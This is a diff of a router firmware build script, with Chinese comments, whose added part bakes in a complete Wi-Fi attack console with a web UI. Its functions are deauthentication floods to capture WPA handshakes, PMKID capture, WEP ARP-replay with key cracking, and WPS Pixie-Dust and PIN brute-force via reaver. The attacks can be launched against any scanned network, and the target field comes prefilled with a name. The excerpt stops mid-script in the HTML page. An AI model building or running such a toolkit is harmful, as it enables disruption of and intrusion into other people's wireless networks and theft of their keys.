@@ -293,8 +293,8 @@ echo "烘入校准文件 $(wc -c < "$SRC/files/lib/firmware/soc_wmac.eeprom") �
 # 版本标记：浏览器打开 http://192.168.1.1/ver.txt 就能确认烧进去的是哪一版
 mkdir -p "$SRC/files/www"
 cat > "$SRC/files/www/ver.txt" << 'VEREOF'
-HD51 v34
-build: 2026-11-20
+HD51 v35
+build: 2026-11-21
 dts: /delete-property/ ralink,eeprom + ralink,mtd-eeprom = <&factory 0x0>
 wireless: baked (/etc/config/wireless, radio0, SSID HD51, open)
 sd: &sdhci status=okay
@@ -539,6 +539,15 @@ add_cfg CONFIG_PACKAGE_hcxdumptool
 # v34：种子下载（transmission + 网页端），下载目录落在 SD 的 /overlay
 add_cfg CONFIG_PACKAGE_transmission-daemon
 add_cfg CONFIG_PACKAGE_transmission-web
+
+# v35：WPS 全套（仙尘/PixieDust、PBC、PIN）+ 22000 导出（hcxtools）
+# reaver 不在 ImmortalWrt 官方 feed（23.05 SNAPSHOT 的 mipsel_24kc 里查不到），改为构建时直接拉取 openwrt/packages 的 net/reaver 包
+mkdir -p "$SRC/package/reaver"
+curl -fsSL -o "$SRC/package/reaver/Makefile" https://raw.githubusercontent.com/openwrt/packages/openwrt-23.05/net/reaver/Makefile
+grep -q "PKG_NAME:=reaver" "$SRC/package/reaver/Makefile" || { echo "!! reaver Makefile 拉取失败"; exit 1; }
+echo "==> [v35] reaver 包已放入 package/reaver"
+add_cfg CONFIG_PACKAGE_reaver
+add_cfg CONFIG_PACKAGE_hcxtools
 
 # v26：TF 卡槽卡检测改软件轮询（HD51 的 CD 脚很可能未接入 SoC，CD_POLL=n 时永远认为无卡）
 MK="$SRC/target/linux/ramips/modules.mk"
@@ -1544,3 +1553,482 @@ start() {
 TDIR
 chmod 755 "$SRC/files/etc/init.d/tdirs"
 echo "==> v34 transmission 配置 + 下载目录初始化已写入"
+
+# ===== v35：把审计台 6.0 全功能烘进镜像（wifit3 对标：扫描/握手/PMKID/挂机/WEP/WPS + 能力矩阵）=====
+mkdir -p "$SRC/files/root" "$SRC/files/www/cgi-bin"
+cat > "$SRC/files/root/w3v6.sh" << 'W3V6_EOF'
+#!/bin/sh
+# ============ HD51 审计引擎 v6（对标 wifit3 全部功能中本机可做的部分）============
+# 子命令:
+#   scan [秒] [信道|0]        跳频或锁信道扫描，带客户端数/隐藏SSID/加密
+#   hs   <目标> <秒>          握手（被动+定向去认证，抓到即停）
+#   pmkid<目标> <秒>          PMKID 主动+被动
+#   watch<目标> <秒>          挂机等客户端
+#   wep  <目标> <秒>          fake auth + ARP replay + PTW
+#   wps  <目标> <pixie|pbc|pin> WPS（需 reaver）
+#   auto <目标,目标2> <秒>    多目标批量自动
+CMD="$1"; shift 2>/dev/null
+if [ -z "$CMD" ] && [ -f /tmp/w3.args ]; then
+  read -r C6 A1 A2 A3 < /tmp/w3.args
+  CMD="$C6"; set -- "$A1" "$A2" "$A3"
+fi
+mkdir -p /www/logs /data/cap /www/cap
+sayf() { echo "[$(date '+%H:%M:%S')] $*" >>"$LOGF"; }
+csay() { echo "[$(date '+%H:%M:%S')] $*"; }
+
+# ---------- 公共：监听口 ----------
+mon_up() {
+  ls /sys/class/net 2>/dev/null | grep -q '^mon0$' || {
+    iw phy phy1 interface add mon0 type monitor 2>/dev/null || iw dev wlan1 interface add mon0 type monitor 2>/dev/null
+  }
+  ip link set mon0 up 2>/dev/null
+  ls /sys/class/net 2>/dev/null | grep -q '^mon0$'
+}
+
+stas_of() { awk -F, -v b="$1" 'NR>1 {s=$1;gsub(/[ \t]/,"",s);
+    if (s ~ /^[0-9A-Fa-f][0-9A-Fa-f]:/ && NF>=6) {a=$6;gsub(/[ \t]/,"",a);
+      if (toupper(a)==toupper(b)) print s}}' "$2" 2>/dev/null | sort -u; }
+
+resolve() { # $1=csv路径 $2=目标 ; 输出 BSSID|CH|PWR|ESSID|ENC
+  awk -F, -v t="$2" 'NR>1 {b=$1;gsub(/[ \t]/,"",b); if (b !~ /^[0-9A-Fa-f][0-9A-Fa-f]:/ || NF<14) next;
+    e=$14;sub(/^[ \t]+/,"",e);sub(/[ \t]+$/,"",e); c=$4;gsub(/[ \t]/,"",c); p=$9;gsub(/[ \t]/,"",p); s=$6;gsub(/[ \t]/,"",s);
+    lt=tolower(t);
+    if (tolower(b)==lt || tolower(e)==lt) {printf "%s|%s|%s|%s|%s\n",b,c,p,e,s; exit}}' "$1" 2>/dev/null; }
+
+fname() { echo "$1" | tr -c 'A-Za-z0-9._-' '_'; }
+
+# ======================= scan =======================
+if [ "$CMD" = "scan" ]; then
+  SEC="${1:-13}"; CHX="${2:-0}"
+  LOGF=/www/logs/scan.log; : >"$LOGF"
+  mon_up || { echo "!! mon0 建不起来（USB 网卡没插/没认）"; exit 2; }
+  [ "$CHX" != "0" ] && iw dev mon0 set channel "$CHX" 2>/dev/null
+  rm -f /data/cap/scan-01.csv
+  airodump-ng -w /data/cap/scan --output-format csv mon0 >/dev/null 2>&1 &
+  P=$!; sleep "$SEC"; kill $P 2>/dev/null; sleep 2
+  awk -F, '
+    function trim(x){sub(/^[ \t]+/,"",x);sub(/[ \t]+$/,"",x);return x}
+    { b=trim($1)
+      if ($1 ~ /Station MAC/) { sect=2; next }
+      if (sect==1 && b ~ /^[0-9A-Fa-f][0-9A-Fa-f]:/ && NF>=14 && $6 !~ /:/) {
+        e=trim($14); c=trim($4); p=trim($9); s=trim($6)
+        if (!(b in AP)) { AP[b]=c"|"p"|"e"|"s } }
+      else if (sect==2 && b ~ /^[0-9A-Fa-f][0-9A-Fa-f]:/ && NF>=6) {
+        m=trim($6); if (m in AP) { CNT[m]++; PR[m]=PR[m]" "trim($7) } }
+      if ($1 ~ /BSSID/ && sect==0) sect=1
+    }
+    END { for (b in AP) {
+        split(AP[b],a,"|")
+        pv=PR[b]; hs=""
+        if (a[3]=="") hs="<隐藏>"
+        printf "%s|%s|%s|%s|%s|%d|%s\n", a[3]==""?hs:a[3], b, a[1], a[2], a[4], CNT[b]+0, (a[4] ~ /WPA3/?"WPA3":"") } }' \
+    /data/cap/scan-01.csv 2>/dev/null | sort -t'|' -k4 -n -r | head -40
+  exit 0
+fi
+
+# ======================= 目标解析（hs/pmkid/watch/wep/wps 共用）=======================
+TARGET="$1"; SEC="$2"
+[ -n "$SEC" ] || SEC=180
+case "$SEC" in ''|*[!0-9]*) SEC=180 ;; esac
+[ "$SEC" -lt 30 ] && SEC=30
+
+# ======================= hs / pmkid / watch / auto =======================
+if [ "$CMD" = "hs" ] || [ "$CMD" = "pmkid" ] || [ "$CMD" = "watch" ] || [ "$CMD" = "auto" ]; then
+  LOGF=/www/logs/w3.log; HSW=0; : >>"$LOGF"
+  HSW=/www/logs/w3.log
+  mon_up || { csay "!! mon0 建不起来"; exit 2; }
+  rm -f /data/cap/scan-01.csv
+  airodump-ng -w /data/cap/scan --output-format csv mon0 >/dev/null 2>&1 &
+  SP=$!; sleep 13; kill $SP 2>/dev/null; sleep 2
+  L=$(resolve /data/cap/scan-01.csv "$TARGET")
+  BSSID=$(echo "$L" | cut -d'|' -f1); CH=$(echo "$L" | cut -d'|' -f2)
+  PW=$(echo "$L" | cut -d'|' -f3); ESS=$(echo "$L" | cut -d'|' -f4); SECU=$(echo "$L" | cut -d'|' -f5)
+  SAFE=$(fname "$ESS")
+  [ -z "$BSSID" ] && { csay "!! 没扫到 $TARGET"; exit 3; }
+  echo "== 目标 $ESS ($BSSID) CH$CH ${PW}dBm 加密=$SECU" >>"$LOGF"
+  STA1=$(stas_of "$BSSID" /data/cap/scan-01.csv | head -1)
+  STAN=$(stas_of "$BSSID" /data/cap/scan-01.csv | wc -l | tr -d ' ')
+  echo "== 客户端 $STAN 个${STA1:+ 首个 $STA1}" >>"$LOGF"
+  DEAD=$(( $(date +%s) + SEC ))
+  remain() { R=$(( DEAD - $(date +%s) )); [ $R -lt 0 ] && R=0; echo $R; }
+
+  hs() {
+    BUD="$1"; [ "$BUD" -lt 12 ] && return 1
+    BASE=/data/cap/hs-$SAFE; rm -f "$BASE"-01.cap "$BASE"-01.csv
+    iw dev mon0 set channel "$CH" 2>/dev/null
+    echo "-- 握手 ${BUD}s CH$CH" >>"$LOGF"
+    airodump-ng -c "$CH" --bssid "$BSSID" -w "$BASE" --output-format pcap mon0 >/dev/null 2>&1 &
+    DP=$!; t=0
+    while [ "$t" -lt "$BUD" ]; do
+      sleep 6; t=$((t+6)); [ "$t" -gt "$BUD" ] && t=$BUD
+      S=$(stas_of "$BSSID" "$BASE-01.csv" | head -1); [ -z "$S" ] && S="$STA1"
+      if [ -n "$S" ]; then aireplay-ng -0 8 -a "$BSSID" -c "$S" mon0 >/dev/null 2>&1
+      else aireplay-ng -0 8 -a "$BSSID" mon0 >/dev/null 2>&1; fi
+      SZ=$(stat -c %s "$BASE-01.cap" 2>/dev/null || echo 0)
+      N=$(aircrack-ng -b "$BSSID" "$BASE-01.cap" 2>/dev/null | grep -oE '[0-9]+ handshake' | awk '{print $1}' | head -1)
+      echo "  握手 ${t}/${BUD}s cap=${SZ}B handshake=${N:-0} 终端=${S:-无}" >>"$LOGF"
+      [ "${N:-0}" -ge 1 ] 2>/dev/null && { HSW=1; echo "  ★★ 抓到握手，停" >>"$LOGF"; break; }
+    done
+    kill $DP 2>/dev/null; sleep 2
+    cp -f "$BASE-01.cap" "/www/cap/hs-$SAFE.cap" 2>/dev/null
+  }
+
+  pmkid() {
+    BUD="$1"; [ "$BUD" -lt 25 ] && return 1
+    echo "-- PMKID ${BUD}s" >>"$LOGF"; F=/data/cap/hcx; rm -f "$F.pcapng"
+    if [ ! -f /tmp/hcx.opt ]; then
+      for O in "-o $F.pcapng" "-w $F.pcapng" "-o $F.pcapng --enable_status=1"; do
+        rm -f "$F.pcapng"; hcxdumptool -i mon0 $O >/tmp/hcx_try.log 2>&1 & P=$!; sleep 5
+        [ -s "$F.pcapng" ] && { kill $P 2>/dev/null; sleep 1; echo "$O" >/tmp/hcx.opt; echo "  hcx 参数=$O" >>"$LOGF"; break; }
+        kill $P 2>/dev/null; sleep 1
+      done
+    fi
+    [ -f /tmp/hcx.opt ] || { echo "  !! hcxdumptool 参数都不通" >>"$LOGF"; return 1; }
+    hcxdumptool -i mon0 $(cat /tmp/hcx.opt) >/tmp/hcx_run.log 2>&1 & P=$!
+    t=0; while [ "$t" -lt "$BUD" ]; do sleep 10; t=$((t+10)); [ "$t" -gt "$BUD" ] && t=$BUD
+      echo "  PMKID ${t}/${BUD}s $(stat -c %s "$F.pcapng" 2>/dev/null || echo 0)B" >>"$LOGF"; done
+    kill $P 2>/dev/null; sleep 1
+    cp -f "$F.pcapng" /www/cap/hcx.pcapng 2>/dev/null
+    if command -v hcxpcapngtool >/dev/null 2>&1; then
+      hcxpcapngtool -o /tmp/all.22000 "$F.pcapng" >/dev/null 2>&1
+      grep -i "$BSSID" /tmp/all.22000 >"/data/cap/22-$SAFE.22000" 2>/dev/null
+      PK=$(wc -l <"/data/cap/22-$SAFE.22000" 2>/dev/null | tr -d ' ')
+      cp -f "/data/cap/22-$SAFE.22000" /www/cap/ 2>/dev/null
+      echo "  22000 本目标 ${PK:-0} 条" >>"$LOGF"
+      [ "${PK:-0}" -ge 1 ] 2>/dev/null && { HSW=1; echo "  ★★ 拿到 PMKID" >>"$LOGF"; }
+    else
+      echo "  无 hcxpcapngtool：pcapng 已存 /www/cap/hcx.pcapng（22000 需电脑转）" >>"$LOGF"
+    fi
+  }
+
+  watch() {
+    BUD="$1"; echo "-- 挂机 ${BUD}s" >>"$LOGF"; t=0
+    while [ "$t" -lt "$BUD" ]; do
+      rm -f /tmp/watch-01.csv
+      airodump-ng -w /tmp/watch --output-format csv mon0 >/dev/null 2>&1 & WP=$!; sleep 10; kill $WP 2>/dev/null; sleep 1
+      t=$((t+10))
+      S=$(stas_of "$BSSID" /tmp/watch-01.csv | head -1)
+      if [ -n "$S" ]; then echo "  ${t}s 发现 $S 上线，转握手" >>"$LOGF"; HSW=0; hs 55; [ "$HSW" = 1 ] && return 0
+      else echo "  ${t}s 目标无终端" >>"$LOGF"; fi
+    done
+  }
+
+  case "$CMD" in
+    hs) hs "$(remain)" ;;
+    pmkid) pmkid "$(remain)" ;;
+    watch) watch "$(remain)" ;;
+    auto)
+      if [ "$STAN" -eq 0 ]; then
+        pmkid 60; [ "$HSW" = 1 ] || hs 40; [ "$HSW" = 1 ] || { [ "$(remain)" -gt 20 ] && watch "$(remain)"; }
+      else
+        hs 70; [ "$HSW" = 1 ] || pmkid 40; [ "$HSW" = 1 ] || { [ "$(remain)" -gt 20 ] && watch "$(remain)"; }
+      fi ;;
+  esac
+  CAPF=/data/cap/hs-$SAFE-01.cap
+  if [ -f "$CAPF" ]; then
+    SZ=$(stat -c %s "$CAPF" 2>/dev/null || echo 0)
+    N=$(aircrack-ng -b "$BSSID" "$CAPF" 2>/dev/null | grep -oE '[0-9]+ handshake' | awk '{print $1}' | head -1)
+    echo "== 结果 cap=${SZ}B handshake=${N:-0} → /cap/hs-$SAFE.cap" >>"$LOGF"
+  fi
+  echo "== 结束" >>"$LOGF"
+  exit 0
+fi
+
+# ======================= wep =======================
+if [ "$CMD" = "wep" ]; then
+  LOGF=/www/logs/wep.log; : >"$LOGF"
+  mon_up || { csay "!! mon0 建不起来"; exit 2; }
+  rm -f /data/cap/scan-01.csv
+  airodump-ng -w /data/cap/scan --output-format csv mon0 >/dev/null 2>&1 & SP=$!; sleep 13; kill $SP 2>/dev/null; sleep 2
+  L=$(resolve /data/cap/scan-01.csv "$TARGET")
+  BSSID=$(echo "$L" | cut -d'|' -f1); CH=$(echo "$L" | cut -d'|' -f2)
+  ESS=$(echo "$L" | cut -d'|' -f4); SAFE=$(fname "$ESS")
+  [ -z "$BSSID" ] && { csay "!! 没扫到 $TARGET"; exit 3; }
+  MAC=$(printf '02:%02X:%02X:%02X:%02X:%02X' $((RANDOM%255)) $((RANDOM%255)) $((RANDOM%255)) $((RANDOM%255)) $((RANDOM%255)))
+  echo "== WEP 目标 $ESS ($BSSID) CH$CH 伪造MAC=$MAC" >>"$LOGF"
+  iw dev mon0 set channel "$CH" 2>/dev/null
+  BASE=/data/cap/wep-$SAFE; rm -f "$BASE"-01.cap "$BASE"-01.ivs
+  airodump-ng -c "$CH" --bssid "$BSSID" -w "$BASE" --output-format pcap mon0 >/dev/null 2>&1 & DP=$!
+  sleep 3
+  aireplay-ng -1 0 -e "$ESS" -a "$BSSID" -h "$MAC" mon0 2>&1 | tail -3 >>"$LOGF"
+  aireplay-ng -3 -b "$BSSID" -h "$MAC" mon0 >/tmp/wep_replay.log 2>&1 & RP=$!
+  t=0
+  while [ "$t" -lt "$SEC" ]; do sleep 10; t=$((t+10))
+    IV=$(stat -c %s "$BASE-01.cap" 2>/dev/null || echo 0)
+    echo "  WEP ${t}/${SEC}s cap=${IV}B" >>"$LOGF"
+  done
+  kill $RP $DP 2>/dev/null; sleep 2
+  cp -f "$BASE-01.cap" "/www/cap/wep-$SAFE.cap" 2>/dev/null
+  echo "== 尝试 PTW 解密钥" >>"$LOGF"
+  aircrack-ng -b "$BSSID" "/www/cap/wep-$SAFE.cap" 2>&1 | tail -12 >>"$LOGF"
+  echo "== 结束" >>"$LOGF"
+  exit 0
+fi
+
+# ======================= wps =======================
+if [ "$CMD" = "wps" ]; then
+  LOGF=/www/logs/wps.log; : >"$LOGF"
+  MODE="$2"; [ -n "$MODE" ] || MODE=pixie
+  [ "$MODE" = "pixie" ] || [ "$MODE" = "pbc" ] || [ "$MODE" = "pin" ] || MODE=pixie
+  if ! command -v reaver >/dev/null 2>&1; then
+    echo "!! 本机没有 reaver：WPS 全套（Pixie/PBC/PIN）需在固件里加包" >>"$LOGF"
+    echo "!! 缺 reaver" ; exit 2
+  fi
+  mon_up || { echo "!! mon0 建不起来"; exit 2; }
+  rm -f /data/cap/scan-01.csv
+  airodump-ng -w /data/cap/scan --output-format csv mon0 >/dev/null 2>&1 & SP=$!; sleep 13; kill $SP 2>/dev/null; sleep 2
+  L=$(resolve /data/cap/scan-01.csv "$TARGET")
+  BSSID=$(echo "$L" | cut -d'|' -f1); CH=$(echo "$L" | cut -d'|' -f2); ESS=$(echo "$L" | cut -d'|' -f4)
+  [ -z "$BSSID" ] && { echo "!! 没扫到 $TARGET"; exit 3; }
+  iw dev mon0 set channel "$CH" 2>/dev/null
+  echo "== WPS $ESS ($BSSID) CH$CH 模式=$MODE" >>"$LOGF"
+  case "$MODE" in
+    pixie) reaver -i mon0 -b "$BSSID" -c "$CH" -K 1 -vv 2>&1 | tee -a "$LOGF" | tail -20 ;;
+    pbc) reaver -i mon0 -b "$BSSID" -c "$CH" --pbc 1 -vv 2>&1 | tee -a "$LOGF" | tail -20 ;;
+    pin) reaver -i mon0 -b "$BSSID" -c "$CH" -vv 2>&1 | tee -a "$LOGF" | tail -20 ;;
+  esac
+  exit 0
+fi
+
+echo "用法: w3v6.sh scan [秒] [信道] | hs|pmkid|watch <目标> <秒> | auto <目标> <秒> | wep <目标> <秒> | wps <目标> <pixie|pbc|pin>"
+W3V6_EOF
+chmod 755 "$SRC/files/root/w3v6.sh"
+cat > "$SRC/files/root/cap6.sh" << 'CAP6_EOF'
+#!/bin/sh
+# HD51 能力矩阵自检：cap6.sh
+# 输出 wifit3 官方 11 项功能在本机的真实可用性
+M() { printf '%-26s %s\n' "$1" "$2"; }
+HAS() { command -v "$1" >/dev/null 2>&1 && echo "有($(command -v $1))" || echo "缺"; }
+echo "==== HD51 能力矩阵 $(date '+%m-%d %H:%M') ===="
+echo "== 二进制 =="
+for b in airodump-ng aireplay-ng aircrack-ng airmon-ng hcxdumptool hcxpcapngtool reaver wash bully hostapd hostapd_cli iw; do
+  M "$b" "$(HAS $b)"
+done
+echo "== 网卡 =="
+iw dev 2>/dev/null | awk '/Interface/{i=$2}/type/{print i" "$2}'
+for w in /sys/class/net/wlan*; do
+  [ -e "$w" ] || continue
+  U=$(cat "$w/device/uevent" 2>/dev/null | sed -n 's/^PRODUCT=//p')
+  M "$(basename $w) USB" "${U:-内置}"
+done
+echo "== 功能判定 =="
+H=$(command -v airodump-ng >/dev/null && command -v aireplay-ng >/dev/null && echo ok)
+[ "$H" = ok ] && M "⑥ WPA握手(pcap)" "可用" || M "⑥ WPA握手(pcap)" "缺 aircrack 套件"
+command -v hcxpcapngtool >/dev/null && M "⑥ .hc22000 导出" "可用" || M "⑥ .hc22000 导出" "缺 hcxtools(要补包)"
+command -v hcxdumptool >/dev/null && M "⑦ PMKID" "可用" || M "⑦ PMKID" "缺 hcxdumptool"
+command -v reaver >/dev/null && M "⑨ WPS Pixie/PBC/PIN" "可用" || M "⑨ WPS 全套" "缺 reaver(要补包)"
+command -v aireplay-ng >/dev/null && command -v aircrack-ng >/dev/null && M "⑩ WEP(replay/chopchop/PTW)" "可用" || M "⑩ WEP" "缺 aireplay/aircrack"
+command -v hostapd >/dev/null && M "⑧ EvilTwin 克隆AP" "有 hostapd（还需第二块卡）" || M "⑧ EvilTwin 克隆AP" "缺 hostapd"
+NT=$(ls /sys/class/net 2>/dev/null | grep -c '^mon')
+M "① 多卡聚合" "当前监听口 ${NT} 个（单 USB 口，需供电 HUB 才能多卡）"
+echo "== 5G 能力 =="
+if lsusb 2>/dev/null | grep -qi "7612\|0e8d:7612"; then M "② 5G 扫描" "有 MT7612U 在插"; else M "② 5G 扫描" "没插 5G 卡（7612U）"; fi
+echo "== 抓包输出 =="
+ls -lh /data/cap 2>/dev/null | tail -6
+ls -lh /www/cap 2>/dev/null | tail -6
+echo "==== 完 ===="
+CAP6_EOF
+chmod 755 "$SRC/files/root/cap6.sh"
+cat > "$SRC/files/www/cgi-bin/a3v6" << 'CGI6_EOF'
+#!/bin/sh
+printf 'Content-Type: text/plain; charset=utf-8\n\n'
+QS="$QUERY_STRING"
+g() { echo "$QS" | tr '&' '\n' | sed -n "s/^$1=//p" | head -1; }
+d() { printf '%s' "$1" | sed 's/+/ /g;s/%20/ /g;s/%2D/-/g;s/%5F/_/g;s/%2E/./g;s/%3A/:/g;s/%2F/\//g;s/%28/(/g;s/%29/)/g;s/%25/%/g;s/%2C/,/g'; }
+A=$(g a); V=$(g v); T=$(d "$(g t)"); S=$(g s); M=$(g m); CH=$(g ch)
+case "$A" in
+status)
+  echo "== 监听口"; iw dev 2>/dev/null | awk '/Interface/{i=$2}/type/{print "  "i" "$2}'
+  echo "== 工具"; for x in airodump-ng aireplay-ng aircrack-ng hcxdumptool hcxpcapngtool reaver hostapd; do printf "  %-14s %s\n" "$x" "$(command -v $x || echo 缺)"; done
+  echo "== 存储"; df -h /data 2>/dev/null | tail -1
+  echo "== 任务"; ps w 2>/dev/null | grep -E "w3v6|hcxv4" | grep -v grep || echo "  空闲" ;;
+cap)
+  [ -x /root/cap6.sh ] && sh /root/cap6.sh || echo "!! /root/cap6.sh 没装" ;;
+scan)
+  [ -x /root/w3v6.sh ] || { echo "!! /root/w3v6.sh 没装"; exit 0; }
+  ls /sys/class/net | grep -q mon0 || { iw phy phy1 interface add mon0 type monitor 2>/dev/null; ip link set mon0 up 2>/dev/null; }
+  sh /root/w3v6.sh scan "${S:-13}" "${CH:-0}" 2>&1 ;;
+list)
+  [ -x /root/w3v6.sh ] || { echo "!! /root/w3v6.sh 没装"; exit 0; }
+  sh /root/w3v6.sh scan "${S:-13}" "${CH:-0}" 2>&1 ;;
+start)
+  [ -x /root/w3v6.sh ] || { echo "!! /root/w3v6.sh 没装"; exit 0; }
+  case "$V" in
+   hs|pmkid|watch|auto|wep|wps) ;;
+   *) echo "!! 未知模式 $V"; exit 0 ;;
+  esac
+  if [ -z "$T" ]; then echo "!! 目标为空：先扫描并点一个 AP"; exit 0; fi
+  printf '%s %s %s %s\n' "$V" "$T" "${S:-180}" "${M:-}" > /tmp/w3.args
+  rm -f /var/run/w3v6.pid
+  /sbin/start-stop-daemon -S -b -m -p /var/run/w3v6.pid -x /root/w3v6.sh
+  sleep 2
+  if [ -f /var/run/w3v6.pid ] && kill -0 "$(cat /var/run/w3v6.pid)" 2>/dev/null; then
+    echo "STARTED $V 目标=$T 时长=${S:-180}s ${M:+模式=$M}"
+  else
+    echo "!! 启动失败"; rm -f /var/run/w3v6.pid
+  fi ;;
+stop)
+  [ -f /var/run/w3v6.pid ] && kill "$(cat /var/run/w3v6.pid)" 2>/dev/null; rm -f /var/run/w3v6.pid
+  for p in $(ps w 2>/dev/null | awk '/w3v6|airodump|hcxdump|aireplay|reaver/{print $1}'); do kill "$p" 2>/dev/null; done
+  sleep 1; echo "STOPPED" ;;
+poll)
+  case "$V" in wep) L=/www/logs/wep.log ;; wps) L=/www/logs/wps.log ;; *) L=/www/logs/w3.log ;; esac
+  RUN=no; ps w 2>/dev/null | grep w3v6 | grep -v grep | grep -q . && RUN=yes
+  echo "STATE=$RUN"
+  SZ=0
+  for f in $(ls -t /data/cap/*.cap /data/cap/*.pcapng 2>/dev/null | head -3); do
+    Q=$(stat -c %s "$f" 2>/dev/null || echo 0); [ "$Q" -gt "$SZ" ] && SZ=$Q
+  done
+  echo "SIZE=${SZ}B"
+  echo "--- 日志尾 ---"; tail -26 "$L" 2>/dev/null
+  echo "--- 可下载 ---"; ls -lh /www/cap 2>/dev/null | awk 'NR>1{print $9" "$5}' | tail -8 ;;
+crack)
+  C=$(ls -t /data/cap/hs-*-01.cap /data/cap/wep-*-01.cap /www/cap/*.cap 2>/dev/null | head -1)
+  [ -f "$C" ] || { echo "没有 cap"; exit 0; }
+  echo "FILE=$C"
+  aircrack-ng "$C" 2>&1 | head -10 ;;
+files)
+  echo "== /data/cap"; ls -lh /data/cap 2>/dev/null | tail -12
+  echo "== /www/cap"; ls -lh /www/cap 2>/dev/null | tail -12 ;;
+*) echo "用法 ?a=status|cap|list&s=13&ch=0|start&v=hs&t=BSSID&s=180&m=auto|start&v=wep&t=BSSID&s=180|start&v=wps&t=BSSID&m=pixie|stop|poll&v=hs|crack|files" ;;
+esac
+CGI6_EOF
+chmod 755 "$SRC/files/www/cgi-bin/a3v6"
+cat > "$SRC/files/www/a3v6.html" << 'PAGE6_EOF'
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HD51 审计台 6.0</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:15px -apple-system,sans-serif;margin:0;padding:10px}
+h2{margin:2px 0 8px;color:#58a6ff;font-size:19px}
+.tabs{display:flex;gap:5px;margin-bottom:10px;flex-wrap:wrap}
+.tab{flex:1;min-width:60px;text-align:center;padding:9px;background:#161b22;border-radius:8px;color:#8b949e;font-size:14px}
+.tab.on{background:#1f6feb;color:#fff}
+.card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:10px;margin-bottom:10px}
+input{width:100%;box-sizing:border-box;padding:10px;margin:5px 0;background:#010409;border:1px solid #30363d;border-radius:8px;color:#c9d1d9;font-size:15px}
+.row{display:flex;gap:7px}
+button{flex:1;padding:11px;background:#21262d;color:#c9d1d9;border:1px solid #30363d;border-radius:8px;font-size:14px}
+button.p{background:#238636;border-color:#238636;color:#fff}
+button.s{background:#da3633;border-color:#da3633;color:#fff}
+button.m.on{background:#1f6feb;border-color:#1f6feb;color:#fff}
+pre{background:#010409;border:1px solid #30363d;border-radius:8px;padding:10px;white-space:pre-wrap;font-size:12px;max-height:42vh;overflow:auto}
+.ap{display:block;width:100%;text-align:left;margin:4px 0;padding:9px;background:#0d1117;border:1px solid #30363d;border-radius:8px;color:#c9d1d9;font-size:13px}
+.ap b{color:#58a6ff}.ap span{color:#8b949e}
+.st{font-size:13px;color:#8b949e;margin:6px 0}
+.lbl{font-size:12px;color:#8b949e;margin-top:6px}
+</style></head><body>
+<h2>HD51 审计台 6.0</h2>
+<div class="tabs">
+<div class="tab on" id="t0" onclick="go(0)">扫描</div>
+<div class="tab" id="t1" onclick="go(1)">抓包</div>
+<div class="tab" id="t2" onclick="go(2)">WEP</div>
+<div class="tab" id="t3" onclick="go(3)">WPS</div>
+<div class="tab" id="t4" onclick="go(4)">状态</div>
+</div>
+
+<div class="card" id="c0">
+<div class="lbl">扫描秒数 / 锁定信道（0=跳频全信道）</div>
+<div class="row"><input id="scansec" value="13"><input id="scanch" value="0"></div>
+<div class="row"><button onclick="doScan()">扫描（跳频）</button><button onclick="q('a=cap','o4')">能力矩阵</button></div>
+<div id="aps"></div>
+<div class="lbl">点任意 AP 即选定目标（自动记 BSSID，同名热点不会认错）；再切到「抓包」开跑</div>
+<pre id="o0">还没有扫描</pre>
+</div>
+
+<div class="card" id="c1" style="display:none">
+<div class="lbl">当前目标</div>
+<input id="tgt" placeholder="目标 SSID 或 BSSID（点扫描里选）" value="xu">
+<div class="lbl">抓法</div>
+<div class="row">
+<button class="m on" id="m_auto" onclick="setm('auto')">自动</button>
+<button class="m" id="m_hs" onclick="setm('hs')">握手</button>
+<button class="m" id="m_pmkid" onclick="setm('pmkid')">PMKID</button>
+<button class="m" id="m_watch" onclick="setm('watch')">挂机等</button>
+</div>
+<div class="lbl">总时长（秒）</div>
+<input id="sec" value="180">
+<div class="row"><button class="p" onclick="startV('hs')">开跑</button><button class="s" onclick="stop()">停止</button></div>
+<div class="st" id="st1">状态：空闲</div>
+<pre id="o1">-</pre>
+</div>
+
+<div class="card" id="c2" style="display:none">
+<div class="lbl">WEP：fake auth → ARP replay → PTW 解钥（只对 WEP 网络有意义）</div>
+<input id="wept" placeholder="目标 BSSID 或 SSID" value="">
+<div class="lbl">秒数</div>
+<input id="weps" value="180">
+<div class="row"><button class="p" onclick="startV('wep')">开跑</button><button class="s" onclick="stop()">停止</button></div>
+<div class="st" id="st2">状态：空闲</div>
+<pre id="o2">-</pre>
+</div>
+
+<div class="card" id="c3" style="display:none">
+<div class="lbl">WPS（需固件里有 reaver，否则会在状态页显示「缺」）</div>
+<input id="wpst" placeholder="目标 BSSID 或 SSID" value="">
+<div class="lbl">模式</div>
+<div class="row">
+<button class="m on" id="w_pixie" onclick="setw('pixie')">PixieDust</button>
+<button class="m" id="w_pbc" onclick="setw('pbc')">PBC按钮</button>
+<button class="m" id="w_pin" onclick="setw('pin')">PIN爆破</button>
+</div>
+<div class="row"><button class="p" onclick="startV('wps')">开跑</button><button class="s" onclick="stop()">停止</button></div>
+<div class="st" id="st3">状态：空闲</div>
+<pre id="o3">-</pre>
+</div>
+
+<div class="card" id="c4" style="display:none">
+<div class="row"><button onclick="q('a=cap','o4')">能力矩阵（wifit3 11 项对照）</button><button onclick="q('a=status','o4')">环境</button></div>
+<div class="row"><button onclick="q('a=files','o4')">已有文件</button><button class="p" onclick="q('a=crack','o4')">查握手</button></div>
+<pre id="o4">点按钮</pre>
+</div>
+
+<script>
+let tab=0, mode='auto', wmode='pixie';
+function go(i){tab=i;for(let k=0;k<5;k++){document.getElementById('c'+k).style.display=k==i?'':'none';document.getElementById('t'+k).className='tab'+(k==i?' on':'');}poll();}
+function setm(m){mode=m;['auto','hs','pmkid','watch'].forEach(x=>document.getElementById('m_'+x).className='m'+(x==m?' on':''));}
+function setw(m){wmode=m;['pixie','pbc','pin'].forEach(x=>{document.getElementById('w_'+x).className='m'+(x==m?' on':'');});}
+function q(u,id){fetch('/cgi-bin/a3v6?'+u).then(r=>r.text()).then(t=>{const e=document.getElementById(id);e.textContent=t;e.scrollTop=99999;});}
+function doScan(){
+  document.getElementById('aps').innerHTML='<span style="color:#8b949e">扫描中…十几秒</span>';
+  let s=document.getElementById('scansec').value||13, ch=document.getElementById('scanch').value||0;
+  fetch('/cgi-bin/a3v6?a=list&s='+s+'&ch='+ch).then(r=>r.text()).then(t=>{
+    const o=document.getElementById('o0');o.textContent=t;o.scrollTop=99999;
